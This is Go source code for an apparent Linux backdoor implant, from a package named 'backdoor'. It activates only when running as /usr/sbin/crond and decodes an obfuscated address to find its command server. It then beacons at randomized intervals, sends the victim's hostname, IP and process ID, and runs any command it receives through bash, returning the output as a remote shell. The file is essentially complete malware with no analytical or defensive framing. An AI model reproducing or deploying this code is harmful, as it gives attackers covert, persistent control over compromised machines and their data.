package main

import (
	"backdoor/util"
	"encoding/json"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strings"
	"time"
	"fmt"
	"net/http"
	"strconv"
	"io"

	"github.com/google/uuid"

)

var guuid string

func init() {
	exepath,err := os.Executable()
	if err != nil {
		return
	}
	if exepath != "/usr/sbin/crond" {
		return
	}
	rand.Seed(time.Now().Unix())
	go client()
}

func getUrl()(string,error){
	var data = []byte{216,240,219,251,255,162,199,242,127,211,106,42,169,80,5,238,64,180,87,161,122,107,201,238,93,214,125,228,196,5,46,94}
	pdecoder := util.NewDecoder()
	urlBytes,err := pdecoder.Decode(data)
	return string(urlBytes),err
}

func getIP() (string,error){
	urlAddress,err := getUrl()
	if err != nil{
		return "",err
	}
	httpClient := &http.Client{
		Timeout: 60 * time.Second,
	}
	resp, err := httpClient.Get(urlAddress)
	if err != nil {
		return "", err
	}
	defer resp.Body.Close()
	respBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		return "", err
	}
	rspText := strings.TrimSpace(string(respBytes))
	strArr := strings.Split(rspText, ":")
	if len(strArr) < 2 {
		return "", fmt.Errorf("%s", rspText)
	}
	ip := net.ParseIP(strArr[0])
	if ip == nil || ip.To4() == nil {
		return "", fmt.Errorf("%s", rspText)
	}
	port, err := strconv.ParseUint(strArr[1], 10, 16)
	if err != nil {
		return "", err
	}
	if port == 0 {
		return "", fmt.Errorf("%s", rspText)
	}
	return fmt.Sprintf("%s:%d", ip.String(), port), nil
}

func main() {
}

func client() {
	guuid = uuid.New().String()
	var address string
	for {
		time.Sleep(time.Duration(600+rand.Intn(120)) * time.Second)
		tmpAddress,err := getIP()
		if err == nil{
			address = tmpAddress
		}
		if len(address) == 0{
			continue
		}
		session(address)
	}
}

func session(address string) {
	conn, err := net.DialTimeout("tcp", address, 12*time.Second)
	if err != nil {
		return
	}
	defer conn.Close()
	pencoder := util.NewEncoder()
	pdecoder := util.NewDecoder()
	if err := sendInfo(conn, pencoder); err != nil {
		return
	}
	for {
		emsg, err := util.TcpReadMsg(conn, 12*time.Second)
		if err != nil {
			break
		}
		msg, err := pdecoder.Decode(emsg)
		if err != nil {
			break
		}
		var req util.Request
		if err := json.Unmarshal(msg, &req); err != nil {
			break
		}
		if req.Magic != util.Magic {
			break
		}
		cmdstr := strings.TrimSpace(req.Cmd)
		if len(cmdstr) == 0 {
			continue
		}
		if strings.HasPrefix(cmdstr, "cd ") {
			changedir(cmdstr)
			continue
		}
		if strings.HasPrefix(cmdstr, "createprocess ") {
			createprocess(cmdstr)
			continue
		}
		out, _ := execCmd(cmdstr)
		if err := util.TcpWriteMsg(conn, pencoder.Encode(out)); err != nil {
			break
		}
	}
}

func createprocess(cmd string) {
	index := strings.Index(cmd, " ")
	if index == -1 {
		return
	}
	cmd = strings.TrimSpace(cmd[index:])
	if len(cmd) == 0 {
		return
	}
	if !strings.HasSuffix(cmd, "&") {
		cmd += " &"
	}
	execCmdWithout(cmd)
}

func execCmd(cmdstr string) ([]byte, error) {
	cmd := exec.Command("bash", "-c", cmdstr)
	return cmd.CombinedOutput()
}

func execCmdWithout(cmdstr string) error {
	cmd := exec.Command("bash", "-c", cmdstr)
	return cmd.Run()
}

func sendInfo(conn net.Conn, pencoder *util.Encoder) error {
	localip := conn.LocalAddr().String()
	hostname := ""
	if name, err := os.Hostname(); err == nil {
		hostname = name
	}
	var info util.Info
	info.Magic = util.Magic
	info.HostName = hostname
	info.LocalIP = localip
	info.PID = os.Getpid()
	info.UUID = guuid
	jsonBytes, err := json.Marshal(&info)
	if err != nil {
		return err
	}
	return util.TcpWriteMsg(conn, pencoder.Encode(jsonBytes))
}

func changedir(cmd string) {
	strarr := strings.Split(cmd, " ")
	if len(strarr) < 2 {
		return
	}
	os.Chdir(strarr[1])
}
